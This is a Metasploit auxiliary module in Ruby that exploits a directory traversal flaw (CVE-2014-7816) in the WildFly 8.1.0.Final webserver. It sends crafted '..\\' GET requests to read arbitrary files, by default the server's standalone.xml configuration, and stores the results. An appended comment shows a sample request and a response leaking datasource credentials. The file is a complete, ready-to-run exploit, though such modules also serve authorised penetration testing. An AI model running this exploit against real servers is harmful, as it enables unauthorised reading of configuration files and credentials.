##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WildFly 8 (JBossAS) Directory Traversal',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability found in WildFly
        8.1.0.Final webserver on port 8080.
      },
      'References'     =>
        [
          [ 'CVE', '2014-7816' ],
          [ 'URL', 'https://access.redhat.com/security/cve/CVE-2014-7816' ],
          [ 'URL', 'https://www.conviso.com.br/advisories/CONVISO-14-001.txt' ],
          [ 'URL', 'http://www.openwall.com/lists/oss-security/2014/11/27/4' ]
        ],
      'Author'         => 'Roberto Soares Espreto <robertoespreto[at]gmail.com>',
      'License'        => MSF_LICENSE,
      'DisclosureDate' => 'Oct 22 2014'
    ))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new("FILEPATH", [true, 'Full path to the file to read', 'standalone\\\\configuration\\\\standalone.xml'])
      ], self.class)

    register_advanced_options(
      [
        OptInt.new('TRAVERSAL_DEPTH', [true, 'Traversal depth', 1])
      ], self.class)

    deregister_options('RHOST')
  end

  def run_host(ip)
    print_status("Attempting to download: #{datastore['FILEPATH']}")

    traversal = "..\\" * datastore['TRAVERSAL_DEPTH']
    res = send_request_raw({
      'method' => 'GET',
      'uri'    => "/#{traversal}\\#{datastore['FILEPATH']}"
    },)

    if res && res.code == 200
      vprint_line(res.to_s)
      fname = File.basename(datastore['FILEPATH'])

      path = store_loot(
        'wildfly.http',
        'application/octet-stream',
        ip,
        res.body,
        fname
      )
      print_status("File saved in: #{path}")
    else
      print_error("Nothing was downloaded")
    end
  end
end

=begin
GET /..\\standalone\\configuration\\standalone.xml HTTP/1.1
User-Agent: curl/7.38.0
Host: 127.0.0.1:8080
Accept: */*

HTTP/1.1 200 OK
Connection: keep-alive
Last-Modified: Wed, 22 Oct 2014 14:37:28 GMT
X-Powered-By: Undertow/1
Server: WildFly/8
Content-Type: text/xml
Content-Length: 19697
Date: Wed, 22 Oct 2014 16:32:08 GMT

<?xml version='1.0' encoding='UTF-8'?>

<server xmlns="urn:jboss:domain:2.1">
<extensions>
<extension module="org.jboss.as.clustering.infinispan"/>
...snip...
<subsystem xmlns="urn:jboss:domain:datasources:2.0">
<datasources>
<datasource jndi-name="java:jboss/datasources/ExampleDS" pool-name="ExampleDS" enabled="true" use-java-context="true">
<connection-url>jdbc:h2:mem:test;DB_CLOSE_DELAY=-1;DB_CLOSE_ON_EXIT=FALSE</connection-url>
<driver>h2</driver>
<security>
<user-name>sa</user-name>
<password>sa</password>
</security>
</datasource>
<drivers>
<driver name="h2" module="com.h2database.h2">
<xa-datasource-class>org.h2.jdbcx.JdbcDataSource</xa-datasource-class>
...snip...
=end
